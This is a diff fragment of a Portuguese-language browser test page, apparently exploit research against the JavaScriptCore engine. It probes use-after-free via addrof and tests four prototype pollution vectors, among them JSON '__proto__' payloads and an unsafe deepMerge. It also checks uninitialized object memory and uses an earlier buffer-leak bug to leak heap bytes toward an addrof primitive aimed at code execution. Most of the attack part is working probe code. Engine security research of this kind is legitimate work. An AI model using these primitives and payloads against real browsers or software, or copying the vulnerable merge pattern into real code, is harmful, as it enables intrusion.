+            info('NOTA: Em JS, qualquer referência strong mantém o objeto vivo.');
+            info('"captured" É uma referência strong → objeto nunca será coletado enquanto captured existir.');
+            info('Para UAF real precisamos capturar o ponteiro como NUMBER (bits), não como object reference.');
+          }
+        }
+      }
+    } catch(e) {
+      alerta('EXCECAO ao acessar captured após GC: ' + e.message + '\n' +
+             'O objeto foi coletado e o acesso via captured causou exceção!\n' +
+             'Isso é evidência de UAF — acesso a memória após free!');
+    }
+  } else {
+    info('Objeto ainda vivo após GC (motor não coletou — referência "captured" mantém vivo).');
+    info('Para UAF precisamos do ponteiro como bits numéricos, não como JS reference.');
+    info('Com addrof, poderíamos criar um Int32Array sobre o endereço e checar se mudou.');
+    sep();
+    info('\nCONCLUSÃO SOBRE UAF:');
+    info('UAF em JS requer ter o ENDEREÇO do objeto como número (addrof).');
+    info('Com addrof: criar DataView sobre o endereço, liberar objeto, ler bytes = dados do novo objeto.');
+    info('Sem addrof: não conseguimos observar a reutilização de endereço via JS puro.');
+    info('O motor mantém o objeto vivo enquanto "captured" for uma referência JS strong.');
+    info('→ UAF clássico requer addrof primeiro.');
+  }
+}
+
+// ─── 49-C ─────────────────────────────────────────────────────────────────
+function runC() {
+  log.textContent = '[TEST 49-C] Prototype Pollution — escalação alternativa sem addrof\n';
+  sep();
+  info('Escalação alternativa: prototype pollution não precisa de addrof.');
+  info('Se conseguirmos poluir Object.prototype, qualquer objeto criado depois');
+  info('herda as propriedades injetadas — pode levar a RCE via execução de código.\n');
+
+  info('Vetores de prototype pollution neste motor:\n');
+
+  // Vetor 1: __proto__ direto
+  info('Vetor 1: __proto__ assignment direto...');
+  try {
+    var innocent = {};
+    innocent.__proto__ = { injected: function() { return 'POLLUTED'; } };
+    var test = {};
+    info('test.injected: ' + test.injected);
+    if(typeof test.injected === 'function') {
+      alerta('PROTOTYPE POLLUTION via __proto__!\n' +
+             'test.injected = ' + test.injected() + '\n' +
+             'Object.prototype foi modificado via __proto__ assignment!\n' +
+             'Qualquer objeto {} tem agora o método injected()!');
+    } else {
+      ok('__proto__ assignment não poluiu Object.prototype (sandboxed corretamente).');
+    }
+  } catch(e) { info('__proto__ assignment: ' + e.message); }
+
+  sep();
+  // Vetor 2: Object.assign com __proto__
+  info('Vetor 2: Object.assign com __proto__ como chave...');
+  try {
+    var source = JSON.parse('{"__proto__": {"polluted2": true}}');
+    Object.assign({}, source);
+    var test2 = {};
+    info('test2.polluted2: ' + test2.polluted2);
+    if(test2.polluted2 === true) {
+      alerta('PROTOTYPE POLLUTION via Object.assign + JSON.parse!\n' +
+             'test2.polluted2 = true — Object.prototype poluído!');
+    } else {
+      ok('Object.assign + JSON __proto__ não poluiu (correto).');
+    }
+  } catch(e) { info('Object.assign __proto__: ' + e.message); }
+
+  sep();
+  // Vetor 3: constructor.prototype
+  info('Vetor 3: constructor.prototype manipulation...');
+  try {
+    var obj = {};
+    obj.constructor.prototype.polluted3 = 'INJECTED_VALUE';
+    var test3 = {};
+    info('test3.polluted3: ' + test3.polluted3);
+    if(test3.polluted3 === 'INJECTED_VALUE') {
+      alerta('PROTOTYPE POLLUTION via constructor.prototype!\n' +
+             'test3.polluted3 = "INJECTED_VALUE" — Object.prototype poluído!\n' +
+             'Isso afeta TODOS os objetos criados após essa poluição!\n\n' +
+             'IMPACTO RCE: se uma função de biblioteca faz obj[campo]() onde campo\n' +
+             'pode ser "constructor", "toString", "valueOf" etc, podemos injetar\n' +
+             'código executável em callbacks e event handlers!');
+
+      // Limpar a poluição
+      delete Object.prototype.polluted3;
+      info('Poluição removida via delete Object.prototype.polluted3');
+    } else {
+      ok('constructor.prototype não poluiu (correto).');
+    }
+  } catch(e) { info('constructor.prototype: ' + e.message); }
+
+  sep();
+  // Vetor 4: merge profundo com __proto__ aninhado
+  info('Vetor 4: merge profundo com __proto__ aninhado...');
+  function deepMerge(target, src) {
+    for(var key in src) {
+      if(typeof src[key] === 'object' && src[key] !== null) {
+        if(!target[key]) target[key] = {};
+        deepMerge(target[key], src[key]);
+      } else {
+        target[key] = src[key];
+      }
+    }
+    return target;
+  }
+
+  try {
+    var payload = JSON.parse('{"a":{"__proto__":{"polluted4":"RCE_POSSIBLE"}}}');
+    deepMerge({}, payload);
+    var test4 = {};
+    info('test4.polluted4: ' + test4.polluted4);
+    if(test4.polluted4 === 'RCE_POSSIBLE') {
+      alerta('PROTOTYPE POLLUTION via DEEP MERGE!\n' +
+             'test4.polluted4 = "RCE_POSSIBLE"\n' +
+             'deepMerge com objeto contendo __proto__ aninhado poluiu Object.prototype!\n\n' +
+             'IMPACTO: Se qualquer código no sistema (service worker, event handler,\n' +
+             'biblioteca interna) fizer deepMerge com dados externos controlados,\n' +
+             'um atacante pode injetar propriedades em todos os objetos!\n' +
+             'Dependendo do que é feito com as propriedades injetadas, pode levar a RCE.');
+      delete Object.prototype.polluted4;
+    } else {
+      ok('deepMerge com __proto__ não poluiu (for..in não itera __proto__ como string).');
+    }
+  } catch(e) { info('deepMerge: ' + e.message); }
+}
+
+// ─── 49-D ─────────────────────────────────────────────────────────────────
+async function runD() {
+  log.textContent = '[TEST 49-D] Butterfly não-zerado: objetos JS têm dados não-inicializados?\n';
+  sep();
+  info('ArrayBuffers são zero-inicializados (48-B confirmou).');
+  info('MAS: o BUTTERFLY de objetos JS (onde ficam propriedades inline) pode não ser!');
+  info('Se criarmos um objeto JS com muitas propriedades, e o butterfly usar memória');
+  info('de um butterfly anterior de outro objeto, os bytes podem conter dados antigos.\n');
+  info('Estratégia:');
+  info('  1. Criar 10000 objetos com valores específicos + destruir');
+  info('  2. Criar novo objeto e ler propriedades não-inicializadas');
+  info('  3. Se uma propriedade retornar valor antigo = butterfly não-zerado!\n');
+
+  // Criar e destruir objetos com valores específicos
+  info('Fase 1: criar/destruir 5000 objetos com magic values...');
+  var trash = [];
+  var MAGIC = 3.14159265358979; // π como sentinela
+  for(var i=0;i<5000;i++) {
+    trash.push({
+      p0: MAGIC, p1: MAGIC+1, p2: MAGIC+2, p3: MAGIC+3,
+      p4: MAGIC+4, p5: MAGIC+5, p6: MAGIC+6, p7: MAGIC+7,
+      extra: new Uint32Array(4)
+    });
+  }
+  trash = null;
+  for(var gc=0;gc<5;gc++) forceGC();
+  info('Objetos destruídos e GC executado.');
+  sep();
+
+  // Criar novo objeto com mesma "shape" (mesmo conjunto de propriedades)
+  info('Fase 2: criando novo objeto com mesma shape...');
+  var freshObj = {
+    p0: undefined, p1: undefined, p2: undefined, p3: undefined,
+    p4: undefined, p5: undefined, p6: undefined, p7: undefined,
+    extra: null
+  };
+
+  info('Valores iniciais do freshObj:');
+  ['p0','p1','p2','p3','p4','p5','p6','p7'].forEach(function(k) {
+    info('  freshObj.'+k+' = '+freshObj[k]);
+  });
+
+  var hasNonUndefined = ['p0','p1','p2','p3','p4','p5','p6','p7'].some(function(k) {
+    return freshObj[k] !== undefined;
+  });
+
+  if(hasNonUndefined) {
+    alerta('BUTTERFLY NÃO-ZERADO!\n' +
+           'freshObj contém valores não-undefined mesmo sem atribuição!\n' +
+           'O butterfly foi reutilizado sem zero-fill!\n' +
+           'Estes valores podem ser ponteiros ou dados de objetos anteriores!');
+  } else {
+    ok('Todas as propriedades são undefined (butterfly zerado ou inicializado com undefined).');
+    info('Tentando variante: criar objeto SEM declarar todas as props primeiro...');
+
+    // Variante: acessar propriedade não-existente antes e depois do GC
+    var testObj = {};
+    info('\ntestObj.uninitialized_prop = ' + testObj.uninitialized_prop);
   }
 
   sep();
-  // Mostrar distribuição dos tempos
-  info('\nDistribuição de tempos (primeiras 20 posições):');
-  for(var i=0;i<Math.min(20, POSITIONS_TO_TEST);i++) {
-    var bar = '█'.repeat(Math.round(timings[i] / minTime));
-    info('bigF64[' + i.toString().padStart(3) + ']: ' + timings[i].toFixed(4) + 'ms ' + bar);
+  // ABORDAGEM PRINCIPAL 49-D: Usar Vuln #1 (buffer leak) para vazar o BUTTERFLY
+  // Um ArrayBuffer cujos primeiros bytes estão adjacentes ao butterfly de um objeto JS
+  info('\nAbordagem principal: Vazar o butterfly de um objeto via ArrayBuffer adjacente...');
+  info('Alocar {buf: new ArrayBuffer(64), obj: {magic: 0xBEEFBEEF}} e vazar o buffer.');
+  info('Se buf e obj.butterfly estiverem adjacentes no heap, os bytes vazados');
+  info('conterão o layout do butterfly, incluindo ponteiros para propriedades inline.\n');
+
+  var ROUNDS = 10;
+  var foundPointers = [];
+
+  for(var round=0;round<ROUNDS;round++) {
+    var container = {
+      buf: new ArrayBuffer(64),
+      // Objeto JS com muitas propriedades para ter butterfly grande
+      obj: { 
+        magic: 0xBEEFBEEF, 
+        a: 1.1, b: 2.2, c: 3.3, d: 4.4,
+        e: 5.5, f: 6.6, g: 7.7, h: 8.8,
+        arr: new Uint32Array([0xAABB, 0xCCDD, 0xEEFF, 0x0011])
+      }
+    };
+
+    // Preencher buf com zeros
+    new Uint32Array(container.buf).fill(0);
+
+    var leaked = await leakBuffer(container.buf);
+    if(!leaked) continue;
+
+    var lU32 = new Uint32Array(leaked);
+    for(var i=0;i<16;i++) {
+      var lo = lU32[i];
+      var hi = (i+1<16) ? lU32[i+1] : 0;
+      if(lo !== 0 || hi !== 0) {
+        foundPointers.push({ round: round, wordIdx: i, lo: lo, hi: hi });
+        info('Round '+round+' word['+i+']: 0x'+hi.toString(16)+'_'+lo.toString(16)+' (não-zero!)');
+      }
+    }
+  }
+
+  if(foundPointers.length > 0) {
+    alerta('BYTES NÃO-ZERO NO BUFFER ADJACENTE AO OBJETO JS!\n' +
+           'O heap colocou dados do objeto próximos ao ArrayBuffer!\n' +
+           foundPointers.slice(0,3).map(function(p) {
+             return 'round='+p.round+' word['+p.wordIdx+']=0x'+p.hi.toString(16)+'_'+p.lo.toString(16);
+           }).join('\n') + '\n\n' +
+           'PRÓXIMO PASSO: Analisar esses valores como ponteiros de heap.\n' +
+           'Se forem ponteiros válidos, temos addrof aproximado via buffer adjacente!');
+  } else {
+    ok('Buffer permaneceu com zeros em todos os ' + ROUNDS + ' rounds.');
+    info('O alocador JSC mantém o ArrayBuffer backing store separado dos objetos JS.');
   }
 }
 </script>
